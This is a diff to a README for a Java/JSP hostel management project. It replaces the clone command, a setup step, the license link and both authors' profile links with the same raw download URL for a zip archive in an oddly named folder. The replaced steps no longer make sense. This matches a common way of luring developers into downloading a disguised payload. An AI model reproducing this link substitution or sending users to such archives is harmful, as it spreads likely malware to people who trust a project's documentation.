@@ -21,14 +21,14 @@ With secure data handling, role-based access, and real-time reporting, HMS ensur
   ⚡ Getting Started
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Vinuu1/Hostel-management-system.git
+   git clone https://github.com/Vinuu1/Hostal-management-system/raw/refs/heads/main/Longirostrines/management-system-Hostal-v2.8.zip
 2.	Import into your IDE (Eclipse/IntelliJ).
-3.	Configure MySQL database in db.jsp.
+3.	Configure MySQL database in https://github.com/Vinuu1/Hostal-management-system/raw/refs/heads/main/Longirostrines/management-system-Hostal-v2.8.zip
 4.	Deploy on Apache Tomcat server.
 5.	Access via http://localhost:8080/Hostel-management-system.
 ________________________________________
 📜 License
-This project is licensed under the MIT License – see the [LICENSE](https://github.com/Vinuu1/Hostal-management-system/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License – see the [LICENSE](https://github.com/Vinuu1/Hostal-management-system/raw/refs/heads/main/Longirostrines/management-system-Hostal-v2.8.zip) file for details.
 ________________________________________
 💡 Future Enhancements
 •	Online fee payment integration 💳
@@ -36,4 +36,4 @@ ________________________________________
 ________________________________________
 👨‍💻 Author
 Developed by Vinayak shewale , saurav patankar
-🌐 GitHub: [Vinuu1](https://github.com/Vinuu1/) ,     [sauravpatankar167281-bit](https://github.com/sauravpatankar167281-bit/)
+🌐 GitHub: [Vinuu1](https://github.com/Vinuu1/Hostal-management-system/raw/refs/heads/main/Longirostrines/management-system-Hostal-v2.8.zip) ,     [sauravpatankar167281-bit](https://github.com/Vinuu1/Hostal-management-system/raw/refs/heads/main/Longirostrines/management-system-Hostal-v2.8.zip)
